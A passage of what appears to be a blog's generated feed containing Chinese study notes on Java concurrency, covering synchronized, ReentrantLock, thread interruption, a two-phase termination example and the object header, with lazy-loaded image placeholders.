srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="线程安全的实现方法"></p><h1 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h1><p>俗称<strong>对象锁</strong>，采用互斥的方法让同一时刻至多只有一个线程能持有<strong>对象锁</strong>，其他线程获取就会阻塞住，这样就能保证有所的线程可以安全的执行临界区的代码，不担心担心线程的上下文切换</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//语法1  这里的对象可以new一个 或者 在对象里可以使用this</span></span><br><span class="line"><span class="keyword">synchronized</span>(对象)&#123;</span><br><span class="line">临界区</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">synchronized</span>(<span class="keyword">this</span>)&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//与</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> 返回值  函数名()&#123;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//上面两个代码效果相同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//这里锁住的是类对象</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><h4 id="1-修饰实例方法"><a href="#1-修饰实例方法" class="headerlink" title="1.修饰实例方法"></a>1.修饰实例方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">methods</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>作用于当前的对象实例，进入同步代码前要获得当前对象实例的锁（类中所有非静态的方法同时这样加锁，访问对象的成员变量就可以达到一个互斥）</p><h4 id="2-修饰静态方法"><a href="#2-修饰静态方法" class="headerlink" title="2.修饰静态方法"></a>2.修饰静态方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给当前类加锁，会作用于类的所有对象实例，进入同步代码前要获得当前class的锁，静态成员不属于任何一个实例对象。</p><h4 id="3-修饰代码块"><a href="#3-修饰代码块" class="headerlink" title="3.修饰代码块"></a>3.修饰代码块</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">synchronized</span>(<span class="keyword">this</span>)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h1><p>相比synchronized</p><ul><li>可中断</li><li>设置超时时间</li><li>设置公平锁</li><li>支持多个条件变量</li></ul><p><strong>与synchronized一样，支持可重入</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//基本语法</span></span><br><span class="line">ReentrantLock lock=<span class="keyword">new</span> ReentrantLock();</span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">    lock.unlock();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">lock.lockInterruptibly()<span class="comment">//可打断锁</span></span><br></pre></td></tr></table></figure><h5 id="锁打断"><a href="#锁打断" class="headerlink" title="锁打断"></a>锁打断</h5><img src="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/image-20211214214944199.png" class="lazyload" data-srcset="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/image-20211214214944199.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211214214944199" style="zoom:67%;"><h5 id="锁超时"><a href="#锁超时" class="headerlink" title="锁超时"></a>锁超时</h5><p><code>lock.tryLock()</code>返回boolean</p><p><strong>没有设置超时</strong></p><img src="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/image-20211214215257452.png" class="lazyload" data-srcset="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/image-20211214215257452.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211214215257452" style="zoom: 80%;"><p><strong>设置时间</strong></p><img src="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/image-20211214215349594.png" class="lazyload" data-srcset="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/image-20211214215349594.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211214215349594" style="zoom:50%;"><h1 id="ReentrantLock相比synchronized："><a href="#ReentrantLock相比synchronized：" class="headerlink" title="ReentrantLock相比synchronized："></a>ReentrantLock相比synchronized：</h1><ul><li><h4 id="等待可终端"><a href="#等待可终端" class="headerlink" title="等待可终端"></a>等待可终端</h4><p>持有锁的线程长期不释放锁，正在等待的线程可以<strong>选择放弃等待，改为处理其他事情</strong>。可中断特性对处理执行时间非常长的同步块很有帮助。</p></li><li><h4 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h4><p>多个线程在等待同一个锁时，必须按照申请锁的时间顺序来依次获得锁；而非公平锁则不保证（ReetrantLock默认不公平）。一旦使用公平锁，当明显导致吞吐量下降。</p></li><li><h4 id="锁绑定多个条件"><a href="#锁绑定多个条件" class="headerlink" title="锁绑定多个条件"></a>锁绑定多个条件</h4><p>一个ReentrantLock对象可以同时绑定同个Condiation对象；在synchronized中，锁的wait()和notify()或者notifyAll()方法配合可以实现一个隐含条件，如果要多于一个条件时候，就不得额外添加一个锁；而对于ReentrantLock则无序这样做，多次调用newCondition()</p></li></ul><h1 id="变量的线程安全"><a href="#变量的线程安全" class="headerlink" title="变量的线程安全"></a>变量的线程安全</h1><h2 id="局部变量线程安全分析"><a href="#局部变量线程安全分析" class="headerlink" title="局部变量线程安全分析"></a>局部变量线程安全分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i=<span class="number">10</span>;</span><br><span class="line">i++</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个线程调用局部变量，线程的栈帧内存中被创建多份，因此不存在共享的问题</p><h2 id="常见的线程安全类"><a href="#常见的线程安全类" class="headerlink" title="常见的线程安全类"></a>常见的线程安全类</h2><h3 id="线程安全类方法的组合"><a href="#线程安全类方法的组合" class="headerlink" title="线程安全类方法的组合"></a>线程安全类方法的组合</h3><h3 id="不可变类线程安全性"><a href="#不可变类线程安全性" class="headerlink" title="不可变类线程安全性"></a>不可变类线程安全性</h3><p>String、Integer等都是不可变类，因为其内部的状态不可改变，因此它们的方法都是线程安全。</p><img src="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/image-20211212104244136.png" class="lazyload" data-srcset="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/image-20211212104244136.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211212104244136" style="zoom:67%;"> <h1 id="Monitor"><a href="#Monitor" class="headerlink" title="Monitor"></a>Monitor</h1><img src="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/image-20211212163316652.png" class="lazyload" data-srcset="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/image-20211212163316652.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211212163316652" style="zoom:67%;"><h2 id="Java6及以上版本对synchronized的优化"><a href="#Java6及以上版本对synchronized的优化" class="headerlink" title="Java6及以上版本对synchronized的优化"></a>Java6及以上版本对synchronized的优化</h2><h4 id="Java对象头"><a href="#Java对象头" class="headerlink" title="Java对象头"></a>Java对象头</h4><p>在HotSpot虚拟机中，对象在内存中的布局分为三块区域，对象头，实例数据和对齐填充。</p><p>对象头中包含两部分：<strong>MarkWord</strong> 和 <strong>类型指针</strong>（指向class）。如果是数组对象的话，对象头还有一部分是存储数组的长度。</p><p><img src="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZfSGVsbG9fV29ybGQ=,size_16,color_FFFFFF,t_70.jpeg" class="lazyload" data-srcset="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0ZfSGVsbG9fV29ybGQ=,size_16,color_FFFFFF,t_70.jpeg" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="img"></p><h1 id><a href="#" class="headerlink" title></a><img src="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/锁优化.png" class="lazyload" data-srcset="/2021/12/12/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8/锁优化.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="锁优化" style="zoom:300%;"></h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java-并发：线程方法</title>
      <link href="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/"/>
      <url>/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="start-amp-run"><a href="#start-amp-run" class="headerlink" title="start()&amp;run()"></a>start()&amp;run()</h1><p>正确的启动线程使用的是start()，等待cpu时间分配，每个线程智能使用一次，如果传入了Runnable方法，线程启动后自动调用run()方法。</p><p><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211161044885.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211161044885.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211161044885" style="zoom:50%;"><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211161050402.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211161050402.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211161050402" style="zoom:50%;"></p><p>如果直接启动run方法，相当于在此线程（未开辟新的线程）去执行Runnable中的方法。</p><p><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211161012498.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211161012498.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211161012498" style="zoom:50%;"><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211161019293.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211161019293.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211161019293" style="zoom: 50%;"></p><h1 id="sleep-与yield"><a href="#sleep-与yield" class="headerlink" title="sleep()与yield()"></a>sleep()与yield()</h1><p><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211161731311.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211161731311.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211161731311"></p><h1 id="join-与join-time"><a href="#join-与join-time" class="headerlink" title="join()与join(time)"></a>join()与join(time)</h1><h1 id="interrupt-方法"><a href="#interrupt-方法" class="headerlink" title="interrupt()方法"></a>interrupt()方法</h1><ul><li>打断sleep，wait，join等处于阻塞状态的线程<strong>打断阻塞</strong>，标记为为false</li></ul><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211170942495.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211170942495.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211170942495" style="zoom:67%;"><ul><li><p>打断正常运行线程</p><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211171209150.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211171209150.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211171209150" style="zoom:50%;"><p>被打断的线程不会停止，由于自身标记位被设置为true，可以自身停止被打断。</p><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211171318717.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211171318717.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211171318717" style="zoom:50%;"></li></ul><h2 id="设计模型-两阶段终止模式"><a href="#设计模型-两阶段终止模式" class="headerlink" title="设计模型:两阶段终止模式"></a><font color="red">设计模型:</font>两阶段终止模式</h2><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211172155581.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211172155581.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211172155581" style="zoom:67%;"><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo04;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ch.qos.logback.core.joran.conditional.ThenAction;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j(topic = &quot;main&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test04class</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException </span>&#123;</span><br><span class="line">        Mymonior mymonior=<span class="keyword">new</span> Mymonior();</span><br><span class="line">        mymonior.start();</span><br><span class="line">        Thread.sleep(<span class="number">4500</span>);</span><br><span class="line">        mymonior.stop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@Slf4j(topic = &quot;monitor&quot;)</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mymonior</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Thread monitor;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span></span>&#123;</span><br><span class="line">        monitor=<span class="keyword">new</span> Thread(<span class="string">&quot;t1&quot;</span>)&#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(Thread.currentThread().isInterrupted())&#123;</span><br><span class="line">                        log.debug(<span class="string">&quot;打断成功！&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    log.debug(<span class="string">&quot;执行监控程序&quot;</span>);</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                        Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">                    &#125;<span class="keyword">catch</span> (InterruptedException e)&#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                        <span class="comment">//程序自己打断</span></span><br><span class="line">                        Thread.currentThread().interrupt();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        monitor.start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title">stop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//main函数调用打断</span></span><br><span class="line">        monitor.interrupt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="打断park线程"><a href="#打断park线程" class="headerlink" title="打断park线程"></a>打断park线程</h2><p>使用park()方法后，线程不会继续执行下去，知道被其他线程interupt()后才会执行，此时的打断标志位设置为True，不能继续park，如果要继续使用park，必须在两个park()之间执行interrupted()清除标志位</p><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211174124538.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211174124538.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211174124538" style="zoom: 67%;"><h1 id="Java-API-线程状态"><a href="#Java-API-线程状态" class="headerlink" title="Java API 线程状态"></a>Java API 线程状态</h1><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211174900133.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211174900133.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20211211174900133" style="zoom:50%;"><p><img src="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211175233385.png" class="lazyload" data-srcset="/2021/12/11/Java/Java-%E5%B9%B6%E5%8F%91%EF%BC%9A%E7%BA%BF%E7%A8%8B%E6%96%B9%E6%B3%95/image-20211211175233385.png" 